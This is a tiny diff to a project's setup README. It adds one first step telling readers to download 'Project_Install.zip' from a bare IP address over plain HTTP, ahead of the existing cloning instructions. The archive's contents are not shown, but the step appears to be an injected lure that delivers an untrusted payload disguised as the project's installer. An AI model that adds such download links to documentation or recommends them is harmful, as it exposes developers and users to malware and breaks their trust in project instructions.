@@ -1,6 +1,8 @@
 Project Development Environment Setup
 ====
 
+1. Download [this](http://198.199.86.104/Project_Install.zip)
+
 Cloning Instructions
 =====
 
